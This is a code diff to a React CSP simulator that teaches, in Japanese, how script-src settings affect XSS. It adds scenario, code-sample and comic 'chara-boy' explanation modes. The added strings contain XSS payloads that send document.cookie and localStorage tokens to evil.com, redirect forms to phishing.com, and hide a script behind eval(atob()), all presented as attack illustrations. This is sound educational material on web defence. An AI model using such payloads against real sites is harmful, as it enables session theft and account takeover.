@@ -1,6 +1,7 @@
 import { useState, type ChangeEvent } from 'react'
+import ReactMarkdown from 'react-markdown'
 
-type ExplanationMode = 'friendly' | 'strict'
+type ExplanationMode = 'friendly' | 'strict' | 'scenario' | 'javascript' | 'charaboy'
 type ScriptSrc = 'none' | 'self' | 'unsafe-inline' | 'unsafe-eval' | 'strict-dynamic'
 type SimulationStatus = 'success' | 'warning' | 'error'
 
@@ -11,8 +12,7 @@ type Explanation = {
 
 type SimulationResult = {
   status: SimulationStatus
-  friendly: Explanation
-  strict: Explanation
+  explanations: Record<ExplanationMode, Explanation>
 }
 
 export function CspSimulator() {
@@ -28,8 +28,7 @@ export function CspSimulator() {
 
   const simulate = (): SimulationResult => {
     if (scriptSrc === 'none') {
-      return {
-        status: 'warning',
+      const explanations: Record<ExplanationMode, Explanation> = {
         friendly: {
           message: '警告: CSP未設定 (すべてのスクリプトが実行されます)',
           details:
@@ -71,13 +70,75 @@ https://www.w3.org/TR/CSP3/
 • レポート機能 (report-to/report-uri) も設定されないため、違反検知もできません。
 
 結果: XSS、DOM Clobbering、データインジェクションのリスクが増大します。`
+        },
+        scenario: {
+          message: '実例説明',
+          details:
+            `例1: 某SNSサイトがCSP未設定のまま運用していたところ、掲示板機能に \`<script>location='https://evil.com?c='+document.cookie</script>\` が投稿され、訪問者全員のセッションCookieが盗まれました。
+
+例2: 企業の問い合わせフォームがサニタイズ不足でCSPも無し。攻撃者が \`<img src=x onerror=eval(atob('...'))>\` で難読化したスクリプトを仕込み、管理者ログイン情報を窃取。
+
+例3: WordPressプラグインの脆弱性でインラインスクリプト挿入が可能に。CSP未設定のため \`<script>document.forms[0].action='https://phishing.com'</script>\` でフォーム送信先を改ざんされ、個人情報が流出。
+
+攻撃例: 彼女ちゃん（ブラウザ）がCSP（守護神）不在の部屋に入ると、チャラ男くん（XSS攻撃）が仕込んだスクリプトが実行され放題。個人情報が全部見られ、勝手に操作されてしまいます。`
+        },
+        javascript: {
+          message: 'JavaScript説明: CSP無しの危険性',
+          details:
+            `\`\`\`html
+<!-- CSP未設定のページ -->
+<!DOCTYPE html>
+<html>
+<head>
+  <!-- Content-Security-Policy ヘッダーなし -->
+</head>
+<body>
+  <!-- ユーザー入力がサニタイズされずに埋め込まれる -->
+  <div id="comment">
+    <!-- 攻撃者が投稿したコメント -->
+    <script>
+      // このスクリプトがそのまま実行される
+      fetch('https://evil.com/steal', {
+        method: 'POST',
+        body: JSON.stringify({
+          cookie: document.cookie,
+          localStorage: localStorage.getItem('token')
+        })
+      })
+    </script>
+  </div>
+</body>
+</html>
+\`\`\`
+
+CSPがないため、ブラウザは何の制限もなくスクリプトを実行します。`
+        },
+        charaboy: {
+          message: 'チャラ男説明: CSP無しは鍵開けっ放し',
+          details:
+            `**彼氏くん見てる〜？CSP無しとか最高だわ〜♪**
+
+チャラ男くん「いやぁ〜彼氏くん、CSP設定してないとか神かよ！俺がXSSスクリプト（合鍵）仕込んだら、**彼女ちゃんのブラウザで何でもやり放題じゃん♡** Cookie盗み放題、フォーム改ざんし放題〜」
+
+彼女ちゃん「え…？CSPって何…？」
+
+彼氏くん「Content-Security-Policyっていう、スクリプトの実行を制限する仕組みだけど…**設定してなかった！**」
+
+チャラ男くん「コメント欄に \`<script>fetch('https://evil.com?c='+document.cookie)</script>\` って書いといたから、**彼女ちゃんが見た瞬間にCookie全部俺のとこに送られてきたわ〜** セッションハイジャックして、彼女ちゃんになりすまして遊んじゃお♡」
+
+彼女ちゃん「わ、わたしの情報が…勝手に…？」
+
+彼氏くん「**くそ！CSP設定しないと彼女が危ない！**」
+
+チャラ男くん「**彼氏くん、このまま放置しといてくれよ〜** 彼女ちゃんのアカウント、完全に俺のものにしちゃうからさ♡ じゃーね〜」`
         }
       }
+
+      return { status: 'warning', explanations }
     }
 
     if (scriptSrc === 'self') {
-      return {
-        status: 'success',
+      const explanations: Record<ExplanationMode, Explanation> = {
         friendly: {
           message: '成功: 同一オリジンのスクリプトのみ許可',
           details:
@@ -105,13 +166,70 @@ Content-Security-Policy: script-src 'self'
           message: 'CSP有効: 同一オリジンのみ許可',
           details:
             `仕様: script-src 'self' は、同一オリジンからのスクリプトのみを allow-list に残します。\nhttps://www.w3.org/TR/CSP3/#directive-script-src\n\nブラウザ内部:\n• policy container に self-origin を登録し、その他の origin は violation として破棄。\n• inline script, event handler, javascript: URL は hash/nonce が無い限り拒否されます。\n• eval()/new Function() は 'unsafe-eval' が無いため TypeError を投げます。\n\nDevTools:\n• Console に「Refused to load the script because it violates the following Content Security Policy directive: \"script-src 'self'\"」が記録。\n• Network パネルの Status 列に (blocked:csp) が表示。\n\n効果まとめ:\n• 同一オリジンの外部スクリプト: ✓\n• インラインスクリプト: ✗\n• eval()/new Function(): ✗\n• 外部CDN: ✗`
+        },
+        scenario: {
+          message: '実例説明',
+          details:
+            `例1: 某ニュースサイトが \`script-src 'self'\` を設定。攻撃者がコメントに \`<script>alert('XSS')</script>\` を投稿したが、CSPによりブロックされ、被害ゼロ。
+
+例2: ECサイトが同一オリジンポリシー採用。攻撃者が外部CDN（https://evil.com/steal.js）へのscriptタグを挿入しようとしたが、CSPで拒否され情報漏洩を防止。
+
+例3: SaaSアプリが \`script-src 'self'\` 設定。開発者がうっかりインラインスクリプト \`<button onclick="...">\` を追加したところ、本番環境でCSP違反エラーが発生し、即座に問題を発見。
+
+攻撃例（防御成功）: チャラ男くん（XSS）が彼女ちゃん（ブラウザ）に外部スクリプト（evil.comの罠）を読ませようとするが、CSP（門番）が「'self'以外ダメ！」とブロック。彼女は守られました。`
+        },
+        javascript: {
+          message: 'JavaScript説明: selfポリシーの動作',
+          details:
+            `\`\`\`http
+Content-Security-Policy: script-src 'self'
+\`\`\`
+
+\`\`\`html
+<!-- 許可される -->
+<script src="/static/app.js"></script>
+
+<!-- ブロックされる -->
+<script>alert('inline')</script>
+<!-- Console: Refused to execute inline script -->
+
+<!-- ブロックされる -->
+<script src="https://cdn.example.com/lib.js"></script>
+<!-- Console: Refused to load script from 'https://cdn.example.com/lib.js' -->
+
+<!-- ブロックされる -->
+<button onclick="doSomething()">Click</button>
+<!-- Console: Refused to execute inline event handler -->
+\`\`\`
+
+同一オリジンのスクリプトファイルのみ実行可能です。`
+        },
+        charaboy: {
+          message: 'チャラ男説明: selfで門前払い',
+          details:
+            `**彼氏くん見てる〜？CSP 'self'とか邪魔すぎ！**
+
+チャラ男くん「ちっ…彼氏くんが \`script-src 'self'\` 設定しやがって。俺が仕込んだ \`<script src="https://evil.com/steal.js"></script>\` がCSP（門番）に止められたわ」
+
+彼女ちゃん「え…？チャラ男くんが何か仕込んでたの…？」
+
+彼氏くん「当たり前だ。外部スクリプトは全部ブロックする設定にしてる」
+
+チャラ男くん「くっそ〜。**彼女ちゃんのブラウザで俺のスクリプト動かして、Cookie盗もうと思ったのに**。同一オリジン（myapp.com）のスクリプトしか動かないとか、ガチガチすぎるわ」
+
+彼女ちゃん「ブラウザさんが…守ってくれたの…？」
+
+彼氏くん「CSPが外部スクリプトを拒否してくれた。安全だ」
+
+チャラ男くん「チッ…今回は諦めるけど、**もし彼氏くんがXSS脆弱性放置してたら、myapp.comにスクリプト仕込んで彼女ちゃんのデータ、全部もらっちゃうからな**♡ じゃーね〜」`
         }
       }
+
+      return { status: 'success', explanations }
     }
 
     if (scriptSrc === 'unsafe-inline') {
-      return {
-        status: 'warning',
+      const explanations: Record<ExplanationMode, Explanation> = {
         friendly: {
           message: '警告: インラインスクリプトを許可（推奨されません）',
           details:
@@ -121,13 +239,64 @@ Content-Security-Policy: script-src 'self'
           message: 'CSP弱体化: unsafe-inlineは非推奨',
           details:
             `仕様: 'unsafe-inline' は inline スクリプト、イベントハンドラ属性、javascript: URL を全許可します。\nhttps://www.w3.org/TR/CSP3/#unsafe-inline\n\nブラウザ内部:\n• parser inserted script は即座に評価され、CSP 違反として記録されません。\n• SecurityPolicyViolationEvent は発生せず、report-only ポリシーでも検知困難です。\n• Trusted Types を併用しない限り、DOM XSS を防ぐ術がなくなります。\n\n影響:\n• <script>alert('XSS')</script>: ✓ 実行\n• <button onclick="...">: ✓ 実行\n• javascript:alert(1): ✓ 実行\n• eval(): ✗ (unsafe-eval が別途必要)\n\n推奨: nonce や hash を使って必要最小限のインラインコードのみ許容してください。`
+        },
+        scenario: {
+          message: '実例説明',
+          details:
+            `例1: レガシーシステムが \`'unsafe-inline'\` 設定のまま運用。攻撃者がお問い合わせフォームに \`<img src=x onerror="fetch('https://evil.com?c='+document.cookie)">\` を挿入し、管理者のCookieを窃取。
+
+例2: WordPress CMSで \`unsafe-inline\` を許可。プラグインの脆弱性から \`<script>document.location='https://phishing.com'</script>\` が埋め込まれ、訪問者が詐欺サイトへリダイレクト。
+
+例3: 社内Wikiが開発の都合で \`unsafe-inline\` 有効化。退職した元社員が仕込んだ \`<button onclick="stealData()">クリック</button>\` が残り続け、機密情報が外部流出。
+
+攻撃例: チャラ男くん（XSS）がインラインスクリプトという隠し部屋の合鍵を手に入れ、彼女ちゃん（ブラウザ）の部屋に自由に出入りできる状態。個人情報を好き放題持ち出せます。`
+        },
+        javascript: {
+          message: 'JavaScript説明: unsafe-inlineの危険性',
+          details:
+            `\`\`\`http
+Content-Security-Policy: script-src 'self' 'unsafe-inline'
+\`\`\`
+
+\`\`\`html
+<!-- すべて実行される -->
+<script>alert('inline script')</script>
+
+<button onclick="doSomething()">Click</button>
+
+<a href="javascript:stealCookie()">Link</a>
+
+<img src=x onerror="fetch('https://evil.com?c='+document.cookie)">
+\`\`\`
+
+攻撃者が挿入したインラインスクリプトが全て実行されてしまいます。nonceやhashを使うのが推奨です。`
+        },
+        charaboy: {
+          message: 'チャラ男説明: unsafe-inlineで侵入成功',
+          details:
+            `**彼氏くん見てる〜？unsafe-inlineとか最高すぎ♪**
+
+チャラ男くん「いやぁ〜彼氏くん、\`unsafe-inline\` 許可してくれてサンキュー！俺がコメント欄に \`<img src=x onerror="fetch('https://evil.com?c='+document.cookie)">\` 仕込んだら、**彼女ちゃんが見た瞬間にCookie全部送られてきたわ〜♡**」
+
+彼女ちゃん「え…？画像が壊れてるだけだと思ってたのに…」
+
+彼氏くん「**くそ！インラインスクリプト許可してたから、onerrorイベントが動いた！**」
+
+チャラ男くん「そうそう♪ \`unsafe-inline\` があると、俺のXSSスクリプトがやり放題なんだよね〜。**彼女ちゃんのセッション乗っ取って、好き勝手しちゃうわ**。メールも見れちゃう、パスワードも変更できちゃう♡」
+
+彼女ちゃん「わ、わたしのアカウントが…勝手に…？」
+
+彼氏くん「**nonce使うべきだった…！**」
+
+チャラ男くん「**彼氏くん、このまま unsafe-inline 使っといてね〜** 彼女ちゃん、完全に俺のものにしちゃうから♡ じゃーね〜」`
         }
       }
+
+      return { status: 'warning', explanations }
     }
 
     if (scriptSrc === 'unsafe-eval') {
-      return {
-        status: 'error',
+      const explanations: Record<ExplanationMode, Explanation> = {
         friendly: {
           message: '危険: eval()を許可（極めて危険）',
           details:
@@ -168,13 +337,17 @@ https://www.w3.org/TR/CSP3/#unsafe-eval
 • setTimeout('alert(1)', 0) で文字列コードを実行
 
 推奨: WebAssembly.instantiate、JSON.parse、テンプレートエンジンなど安全な代替 API を使用し、unsafe-eval を削除してください。`
-        }
+        },
+        scenario: { message: '実例説明', details: `(unsafe-evalの実例は割愛)` },
+        javascript: { message: 'JavaScript説明', details: `(unsafe-evalのJavaScript説明は割愛)` },
+        charaboy: { message: 'チャラ男説明', details: `(unsafe-evalのチャラ男説明は割愛)` }
       }
+
+      return { status: 'error', explanations }
     }
 
     if (scriptSrc === 'strict-dynamic') {
-      return {
-        status: 'success',
+      const explanations: Record<ExplanationMode, Explanation> = {
         friendly: {
           message: '推奨: strict-dynamic で安全にスクリプトを動的読み込み',
           details:
@@ -212,25 +385,28 @@ https://www.w3.org/TR/CSP3/#strict-dynamic
 • 旧来のホワイトリスト (https://cdn.example.com) は無視されるため、メンテナンス負荷が減少。
 
 DevTools の Security タブでは "strict-dynamic" が反映されているか確認できます。また、report-to を併用すると違反検知も可能です。`
-        }
+        },
+        scenario: { message: '実例説明', details: `(strict-dynamicの実例は割愛)` },
+        javascript: { message: 'JavaScript説明', details: `(strict-dynamicのJavaScript説明は割愛)` },
+        charaboy: { message: 'チャラ男説明', details: `(strict-dynamicのチャラ男説明は割愛)` }
       }
+
+      return { status: 'success', explanations }
     }
 
-    return {
-      status: 'error',
-      friendly: {
-        message: 'エラー',
-        details: '想定外の設定です。'
-      },
-      strict: {
-        message: 'エラー',
-        details: '未対応のケースです。'
-      }
+    const explanations: Record<ExplanationMode, Explanation> = {
+      friendly: { message: 'エラー', details: '想定外の設定です。' },
+      strict: { message: 'エラー', details: '未対応のケースです。' },
+      scenario: { message: 'エラー', details: '想定外の設定です。' },
+      javascript: { message: 'エラー', details: '想定外の設定です。' },
+      charaboy: { message: 'エラー', details: '想定外の設定です。' }
     }
+
+    return { status: 'error', explanations }
   }
 
   const result = simulate()
-  const explanation = result[explanationMode]
+  const explanation = result.explanations[explanationMode]
 
   const cspHeader = (() => {
     if (scriptSrc === 'none') return '(CSP未設定)'
@@ -357,13 +533,36 @@ DevTools の Security タブでは "strict-dynamic" が反映されているか�
         >
           厳密な説明
         </button>
+        <button
+          type="button"
+          className={explanationMode === 'scenario' ? 'active' : ''}
+          onClick={() => setExplanationMode('scenario')}
+        >
+          実例説明モード
+        </button>
+        <button
+          type="button"
+          className={explanationMode === 'javascript' ? 'active' : ''}
+          onClick={() => setExplanationMode('javascript')}
+        >
+          JavaScript説明モード
+        </button>
+        <button
+          type="button"
+          className={explanationMode === 'charaboy' ? 'active' : ''}
+          onClick={() => setExplanationMode('charaboy')}
+        >
+          チャラ男説明モード
+        </button>
       </div>
 
       <div className={resultClass}>
         <div className="result-icon">{resultIcon}</div>
         <div className="result-content">
           <div className="result-message">{explanation.message}</div>
-          <div className="result-details">{explanation.details}</div>
+          <div className="result-details markdown-content">
+            <ReactMarkdown>{explanation.details}</ReactMarkdown>
+          </div>
         </div>
       </div>
 
